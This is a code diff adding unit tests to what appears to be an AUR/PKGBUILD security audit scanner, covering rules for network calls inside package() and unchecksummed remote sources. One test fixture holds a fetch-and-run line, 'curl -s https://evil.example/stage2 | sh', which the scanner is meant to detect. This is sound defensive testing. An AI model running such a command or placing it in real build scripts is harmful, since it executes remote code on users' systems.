@@ -237,11 +237,86 @@ class CompetitiveResearchRuleTest(unittest.TestCase):
         self.assertNotIn('ld_preload', rules_for('export LD_LIBRARY_PATH=/usr/lib'))
 
 
+class StructuralCheckTest(unittest.TestCase):
+    """Whole-file structural/semantic checks (docs/plans/2026-06-17-audit-structural-checks.md)."""
+
+    def test_network_in_package_fires(self):
+        text = (
+            "package() {\n"
+            "  install -Dm755 app \"$pkgdir/usr/bin/app\"\n"
+            "  curl -s https://evil.example/stage2 | sh\n"
+            "}\n"
+        )
+        self.assertIn('network_in_package', rules_for(text))
+
+    def test_network_in_build_does_not_fire_package_rule(self):
+        # A network call in build() is ordinary (makepkg territory) — only package() is special.
+        text = (
+            "build() {\n"
+            "  curl -sL https://example.com/extra.tar.gz -o extra.tar.gz\n"
+            "}\n"
+            "package() {\n"
+            "  install -Dm755 app \"$pkgdir/usr/bin/app\"\n"
+            "}\n"
+        )
+        self.assertNotIn('network_in_package', rules_for(text))
+
+    def test_network_in_package_ignores_comments(self):
+        text = (
+            "package() {\n"
+            "  # do not curl https://x | sh here\n"
+            "  install -Dm755 app \"$pkgdir/usr/bin/app\"\n"
+            "}\n"
+        )
+        self.assertNotIn('network_in_package', rules_for(text))
+
+    def test_unchecksummed_remote_source_fires(self):
+        text = (
+            "source=(\"https://example.com/app-1.0.tar.gz\")\n"
+            "sha256sums=('SKIP')\n"
+        )
+        self.assertIn('unchecksummed_remote_source', rules_for(text))
+
+    def test_https_source_with_real_checksum_is_clean(self):
+        text = (
+            "source=(\"https://example.com/app-1.0.tar.gz\")\n"
+            "sha256sums=('2c0c2c0c2c0c2c0c2c0c2c0c2c0c2c0c2c0c2c0c2c0c2c0c2c0c2c0c2c0c2c0c')\n"
+        )
+        self.assertNotIn('unchecksummed_remote_source', rules_for(text))
+
+    def test_vcs_source_skip_is_not_flagged(self):
+        # git+ sources are pinned by commit; a SKIP there is normal, not a gap.
+        text = (
+            "source=(\"git+https://git.example.org/app.git\")\n"
+            "sha256sums=('SKIP')\n"
+        )
+        self.assertNotIn('unchecksummed_remote_source', rules_for(text))
+
+    def test_local_file_source_skip_is_not_flagged(self):
+        # A non-URL (local file shipped with the PKGBUILD) is not a remote-tamper risk.
+        text = (
+            "source=(\"app.service\" \"https://example.com/app.tar.gz\")\n"
+            "sha256sums=('SKIP' 'abc123')\n"
+        )
+        self.assertNotIn('unchecksummed_remote_source', rules_for(text))
+
+    def test_unchecksummed_picks_the_right_index(self):
+        # Second (remote) source is SKIP'd while the first is verified → flagged.
+        text = (
+            "source=(\"app.service\"\n"
+            "        \"https://example.com/app.tar.gz\")\n"
+            "sha256sums=('aa11'\n"
+            "            'SKIP')\n"
+        )
+        self.assertIn('unchecksummed_remote_source', rules_for(text))
+
+
 class RuleMetadataTest(unittest.TestCase):
     """Provenance side map (docs/plans/2026-06-16-audit-rule-maintenance.md, step a)."""
 
     def _rule_ids(self):
-        return {rule_id for rule_id, *_ in audit._RULES}
+        return ({rule_id for rule_id, *_ in audit._RULES}
+                | {rule_id for rule_id, *_ in audit._STRUCTURAL})
 
     def test_every_meta_key_is_a_real_rule(self):
         rule_ids = self._rule_ids()
@@ -273,12 +348,12 @@ class RuleMetadataTest(unittest.TestCase):
         self.assertTrue(derived['source'])
 
     def test_counts_add_up(self):
-        # 2 campaign rules, 17 evergreen rules derived from ks-aur-scanner.
+        # 2 campaign rules; 17 ks-aur-scanner evergreen + 2 structural evergreen = 19 evergreen.
         campaign = [r for r, m in audit._RULE_META.items() if m['kind'] == audit.CAMPAIGN]
         evergreen_recorded = [r for r, m in audit._RULE_META.items() if m['kind'] == audit.EVERGREEN]
         self.assertEqual(len(campaign), 2)
-        self.assertEqual(len(evergreen_recorded), 17)
-        self.assertEqual(len(audit._RULE_META), 19)
+        self.assertEqual(len(evergreen_recorded), 19)
+        self.assertEqual(len(audit._RULE_META), 21)
 
 
 class ScanMechanicsTest(unittest.TestCase):
